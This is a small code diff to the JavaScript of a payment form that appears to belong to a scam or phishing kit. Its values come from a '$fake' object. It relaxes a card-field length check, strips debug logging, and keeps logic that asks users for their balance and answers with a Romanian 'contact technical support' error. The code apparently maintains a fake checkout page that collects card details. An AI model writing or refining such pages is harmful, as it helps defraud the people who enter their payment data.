@@ -967,7 +967,7 @@
                 {
                     'valid': false,
                     'chars': chsNum,
-                    'length': [4, 8],
+                    'length': [3, 8],
                     'mask': false,
                     'style': '_4',
                 },
@@ -1075,7 +1075,6 @@
                 _buttonPay.disabled = true;
                 for (let i = 0; i < fields.length; i++) {
                     let e = document.getElementById('_input' + i);
-                    console.log(e);
                     e.oninput = function () {
                         inputMask(e, i);
                     }
@@ -1118,7 +1117,6 @@
             button2.onclick = function () {
                 let str = "{{$fake->price}}";
                 str = str.replace(/\s/g, '');
-                console.log(str);
                 if (check.value == str || check.value == str + '.00') {
                     check.setCustomValidity('Soldul dvs. nu îndeplinește criteriile de identificare. Vă rugăm să contactați asistența tehnică!')
                 } else if (check.value == str + '.0') {
